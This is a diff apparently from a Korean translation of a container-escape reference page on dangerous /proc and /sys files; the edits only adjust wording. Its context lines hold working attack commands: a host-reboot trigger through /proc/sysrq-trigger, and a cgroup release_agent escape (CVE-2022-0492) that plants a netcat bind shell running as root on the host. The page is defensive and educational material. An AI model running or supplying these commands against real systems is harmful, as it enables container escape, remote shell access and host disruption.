@@ -84,7 +84,7 @@ echo b > /proc/sysrq-trigger # 호스트 재부팅
 #### **`/proc/kmsg`**
 
 - 커널 링 버퍼 메시지를 노출함.
-- 커널 익스플로잇, 주소 누출 및 민감한 시스템 정보를 제공하는 데 도움을 줄 수 있음.
+- 커널 익스플로잇, 주소 유출 및 민감한 시스템 정보를 제공하는 데 도움을 줄 수 있음.
 
 #### **`/proc/kallsyms`**
 
@@ -102,7 +102,7 @@ echo b > /proc/sysrq-trigger # 호스트 재부팅
 #### **`/proc/kcore`**
 
 - 시스템의 물리적 메모리를 ELF 코어 형식으로 나타냄.
-- 읽기는 호스트 시스템 및 다른 컨테이너의 메모리 내용을 누출할 수 있음.
+- 읽기는 호스트 시스템 및 다른 컨테이너의 메모리 내용을 유출할 수 있음.
 - 큰 파일 크기는 읽기 문제나 소프트웨어 충돌을 초래할 수 있음.
 - [2019년 /proc/kcore 덤프하기](https://schlafwandler.github.io/posts/dumping-/proc/kcore/)에서 자세한 사용법.
 
@@ -320,7 +320,7 @@ mkdir -p /tmp/x && echo 1 > /tmp/x/notify_on_release
 echo '/tmp/pwn' > /sys/fs/cgroup/release_agent   # requires CVE-2022-0492
 
 echo -e '#!/bin/sh\nnc -lp 4444 -e /bin/sh' > /tmp/pwn && chmod +x /tmp/pwn
-sh -c "echo 0 > /tmp/x/cgroup.procs"  # triggers the empty-cgroup event
+sh -c "echo 0 > /tmp/x/cgroup.procs"  # 빈 cgroup 이벤트를 트리거합니다.
 ```
 
 When the last process leaves the cgroup, `/tmp/pwn` runs **as root on the host**. Patched kernels (>5.8 with commit `32a0db39f30d`) validate the writer’s capabilities and block this abuse.
